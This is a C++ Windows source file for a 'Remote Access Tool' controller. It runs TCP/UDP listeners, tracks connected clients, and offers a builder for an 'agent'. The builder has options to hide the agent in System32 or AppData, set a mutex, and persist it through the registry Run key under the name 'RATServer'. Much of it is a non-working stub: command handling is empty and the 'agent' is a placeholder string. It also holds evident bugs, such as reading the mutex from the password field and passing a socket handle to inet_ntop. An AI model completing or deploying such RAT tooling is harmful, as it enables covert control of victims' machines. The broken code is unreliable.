#include <iostream>
#include <thread>
#include <vector>
#include <map>
#include <mutex>
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <fstream>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Comctl32.lib")

#define TCP_PORT 9999
#define UDP_PORT 8888
#define BUILDER_FILE "agent_builder.exe"

std::map<std::string, SOCKET> clients;
std::mutex clientsMutex;
SOCKET tcpServerSocket = INVALID_SOCKET;
SOCKET udpServerSocket = INVALID_SOCKET;
HWND clientList, terminalOutput, serverIpInput, serverPortInput, agentIpInput, agentPortInput, passwordInput, startOnStartupCheckbox, statusLabel, startButton, stopButton, buildButton, hideInComboBox;
WSADATA wsaData;

void logMessage(const std::string& message, COLORREF color) {
    int len = GetWindowTextLength(terminalOutput);
    SendMessage(terminalOutput, EM_SETSEL, len, len);
    CHARFORMAT cf = {};
    cf.cbSize = sizeof(CHARFORMAT);
    cf.dwMask = CFM_COLOR;
    cf.crTextColor = color;
    SendMessage(terminalOutput, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
    SendMessage(terminalOutput, EM_REPLACESEL, 0, (LPARAM)message.c_str());
    SendMessage(terminalOutput, EM_REPLACESEL, 0, (LPARAM)"\n");
}

void updateClientList() {
    SendMessage(clientList, LB_RESETCONTENT, 0, 0);
    std::lock_guard<std::mutex> lock(clientsMutex);
    for (const auto& client : clients) {
        SendMessage(clientList, LB_ADDSTRING, 0, (LPARAM)client.first.c_str());
    }
}

void handleTCPClient(SOCKET clientSocket) {
    char recvBuf[1024];
    while (true) {
        int bytesReceived = recv(clientSocket, recvBuf, sizeof(recvBuf), 0);
        if (bytesReceived <= 0) {
            logMessage("TCP client disconnected.", RGB(255, 0, 0));
            std::lock_guard<std::mutex> lock(clientsMutex);
            for (auto it = clients.begin(); it != clients.end(); ++it) {
                if (it->second == clientSocket) {
                    clients.erase(it);
                    break;
                }
            }
            updateClientList();
            closesocket(clientSocket);
            break;
        }
        recvBuf[bytesReceived] = '\0';
        std::string command(recvBuf);
        // Handle TCP command
    }
}

void handleUDPClient(SOCKET clientSocket) {
    char recvBuf[1024];
    while (true) {
        int bytesReceived = recvfrom(clientSocket, recvBuf, sizeof(recvBuf), 0, nullptr, nullptr);
        if (bytesReceived <= 0) {
            logMessage("UDP client disconnected.", RGB(255, 0, 0));
            closesocket(clientSocket);
            break;
        }
        recvBuf[bytesReceived] = '\0';
        std::string command(recvBuf);
        // Handle UDP command
    }
}

void startTCPServer(const std::string& ip, int port) {
    tcpServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (tcpServerSocket == INVALID_SOCKET) {
        logMessage("Error creating TCP socket.", RGB(255, 0, 0));
        return;
    }

    SOCKADDR_IN serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (bind(tcpServerSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logMessage("Bind failed.", RGB(255, 0, 0));
        closesocket(tcpServerSocket);
        return;
    }

    if (listen(tcpServerSocket, SOMAXCONN) == SOCKET_ERROR) {
        logMessage("TCP Listen failed.", RGB(255, 0, 0));
        closesocket(tcpServerSocket);
        return;
    }

    logMessage("TCP Server started, listening on " + ip + ":" + std::to_string(port), RGB(0, 255, 0));

    while (true) {
        SOCKET clientSocket = accept(tcpServerSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            logMessage("TCP Accept failed.", RGB(255, 0, 0));
            continue;
        }

        std::lock_guard<std::mutex> lock(clientsMutex);
        char clientIp[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientSocket, clientIp, INET_ADDRSTRLEN);
        std::string clientInfo = std::string(clientIp) + ":" + std::to_string(port);
        clients[clientInfo] = clientSocket;
        updateClientList();
        std::thread(handleTCPClient, clientSocket).detach();
    }
}

void startUDPServer(const std::string& ip, int port) {
    udpServerSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpServerSocket == INVALID_SOCKET) {
        logMessage("Error creating UDP socket.", RGB(255, 0, 0));
        return;
    }

    SOCKADDR_IN serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (bind(udpServerSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logMessage("Bind failed.", RGB(255, 0, 0));
        closesocket(udpServerSocket);
        return;
    }

    logMessage("UDP Server started, listening on " + ip + ":" + std::to_string(port), RGB(0, 255, 0));

    while (true) {
        char recvBuf[1024];
        SOCKADDR_IN clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        int bytesReceived = recvfrom(udpServerSocket, recvBuf, sizeof(recvBuf), 0, (SOCKADDR*)&clientAddr, &clientAddrSize);
        if (bytesReceived == SOCKET_ERROR) {
            logMessage("UDP Receive failed.", RGB(255, 0, 0));
            continue;
        }
        recvBuf[bytesReceived] = '\0';
        std::string clientIP = inet_ntoa(clientAddr.sin_addr);
        std::string clientInfo = clientIP + ":" + std::to_string(port);
        logMessage("UDP data received from client " + clientInfo + ": " + recvBuf, RGB(0, 255, 0));
        // Handle UDP command
    }
}

void buildAgent(const std::string& ip, int port, const std::string& password, bool startOnStartup, const std::string& hideInDir, const std::string& mutex) {
    std::ofstream agentFile(BUILDER_FILE, std::ios::binary);
    if (!agentFile.is_open()) {
        logMessage("Error: Failed to create agent file.", RGB(255, 0, 0));
        return;
    }

    // Example of writing agent code with parameters
    std::string agentCode = "Agent code with IP: " + ip + ", Port: " + std::to_string(port) + ", Password: " + password + ", Mutex: " + mutex + ", Hide in: " + hideInDir;
    agentFile.write(agentCode.c_str(), agentCode.size());
    agentFile.close();

    if (startOnStartup) {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            char path[MAX_PATH];
            GetModuleFileName(NULL, path, MAX_PATH);
            std::string command = "\"" + std::string(path) + "\"";
            RegSetValueEx(hKey, "RATServer", 0, REG_SZ, (BYTE*)command.c_str(), command.size());
            RegCloseKey(hKey);
        }
    }

    logMessage("Agent built successfully.", RGB(0, 255, 0));
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            CreateWindowW(L"Static", L"Server IP:", WS_VISIBLE | WS_CHILD, 10, 10, 100, 20, hwnd, NULL, NULL, NULL);
            serverIpInput = CreateWindowW(L"Edit", L"127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 10, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Server Port:", WS_VISIBLE | WS_CHILD, 10, 40, 100, 20, hwnd, NULL, NULL, NULL);
            serverPortInput = CreateWindowW(L"Edit", L"9999", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 40, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Agent IP:", WS_VISIBLE | WS_CHILD, 10, 70, 100, 20, hwnd, NULL, NULL, NULL);
            agentIpInput = CreateWindowW(L"Edit", L"127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 70, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Agent Port:", WS_VISIBLE | WS_CHILD, 10, 100, 100, 20, hwnd, NULL, NULL, NULL);
            agentPortInput = CreateWindowW(L"Edit", L"9999", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 100, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Password:", WS_VISIBLE | WS_CHILD, 10, 130, 100, 20, hwnd, NULL, NULL, NULL);
            passwordInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 110, 130, 150, 20, hwnd, NULL, NULL, NULL);

            startOnStartupCheckbox = CreateWindowW(L"Button", L"Start on Startup", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 10, 160, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Hide In:", WS_VISIBLE | WS_CHILD, 10, 190, 100, 20, hwnd, NULL, NULL, NULL);
            hideInComboBox = CreateWindowW(L"ComboBox", NULL, WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST, 110, 190, 150, 20, hwnd, NULL, NULL, NULL);
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"AppData");
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"Program Files");
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"System32");
            SendMessage(hideInComboBox, CB_SETCURSEL, 0, 0);

            CreateWindowW(L"Static", L"Mutex:", WS_VISIBLE | WS_CHILD, 10, 220, 100, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 220, 150, 20, hwnd, NULL, NULL, NULL);

            startButton = CreateWindowW(L"Button", L"Start Server", WS_VISIBLE | WS_CHILD, 10, 250, 120, 30, hwnd, (HMENU)1, NULL, NULL);
            stopButton = CreateWindowW(L"Button", L"Stop Server", WS_VISIBLE | WS_CHILD, 140, 250, 120, 30, hwnd, (HMENU)2, NULL, NULL);
            buildButton = CreateWindowW(L"Button", L"Build Agent", WS_VISIBLE | WS_CHILD, 270, 250, 120, 30, hwnd, (HMENU)3, NULL, NULL);

            clientList = CreateWindowW(L"ListBox", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | LBS_NOTIFY, 10, 300, 200, 200, hwnd, NULL, NULL, NULL);
            terminalOutput = CreateWindowW(L"RichEdit20W", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_READONLY | ES_MULTILINE | ES_AUTOVSCROLL, 220, 300, 300, 200, hwnd, NULL, NULL, NULL);

            LoadLibrary(TEXT("Msftedit.dll"));

            statusLabel = CreateWindowW(L"Static", L"Status: Stopped", WS_VISIBLE | WS_CHILD, 10, 510, 300, 20, hwnd, NULL, NULL, NULL);
            break;
        }
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1) { // Start Server
                char ip[16];
                GetWindowTextA(serverIpInput, ip, sizeof(ip));
                char port[6];
                GetWindowTextA(serverPortInput, port, sizeof(port));
                std::thread(startTCPServer, std::string(ip), atoi(port)).detach();
                std::thread(startUDPServer, std::string(ip), atoi(port)).detach();
                SetWindowText(statusLabel, L"Status: Running");
            } else if (LOWORD(wParam) == 2) { // Stop Server
                if (tcpServerSocket != INVALID_SOCKET) {
                    closesocket(tcpServerSocket);
                    tcpServerSocket = INVALID_SOCKET;
                }
                if (udpServerSocket != INVALID_SOCKET) {
                    closesocket(udpServerSocket);
                    udpServerSocket = INVALID_SOCKET;
                }
                SetWindowText(statusLabel, L"Status: Stopped");
            } else if (LOWORD(wParam) == 3) { // Build Agent
                char agentIp[16];
                GetWindowTextA(agentIpInput, agentIp, sizeof(agentIp));
                char agentPort[6];
                GetWindowTextA(agentPortInput, agentPort, sizeof(agentPort));
                char password[128];
                GetWindowTextA(passwordInput, password, sizeof(password));
                bool startOnStartup = SendMessage(startOnStartupCheckbox, BM_GETCHECK, 0, 0) == BST_CHECKED;
                char hideIn[64];
                GetWindowTextA(hideInComboBox, hideIn, sizeof(hideIn));
                char mutex[64];
                GetWindowTextA(passwordInput, mutex, sizeof(mutex));
                buildAgent(std::string(agentIp), atoi(agentPort), std::string(password), startOnStartup, std::string(hideIn), std::string(mutex));
            }
            break;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "MainWindowClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0,                              // Optional window styles.
        "MainWindowClass",              // Window class
        "Remote Access Tool",           // Window text
        WS_OVERLAPPEDWINDOW,            // Window style

        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, 600, 600,

        NULL,       // Parent window
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );

    if (hwnd == NULL) {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
